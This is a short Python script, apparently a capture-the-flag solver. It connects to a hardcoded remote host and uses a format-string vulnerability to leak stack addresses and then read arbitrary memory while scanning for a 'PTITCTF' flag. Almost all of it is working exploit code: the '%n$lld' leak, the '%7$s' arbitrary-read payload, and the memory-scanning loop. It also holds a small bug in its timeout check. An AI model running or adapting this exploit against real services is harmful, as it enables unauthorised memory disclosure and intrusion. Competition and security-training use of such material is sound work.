#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.04)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

# scan the stack region around env/argv pointers for the flag
s=newconn()
# get a stack pointer and scan a wide region
stack = leak_lld(s,2) & ~0xfff
print("stack page=",hex(stack))
found=[]
# scan upward (argv/env) and downward
for base_delta in [0, 0x1000, -0x1000]:
    T = stack + base_delta
    for d in range(0, 0x80000, 0x8):
        X=T+d
        r=readmem(s,X)
        if b'PTITCTF' in r or b'{' in r:
            print("MARK",hex(X),repr(r[:200])); found.append((X,r))
        if r==b'' or r==b'<T':
            break
print("found",len(found))
s.close()
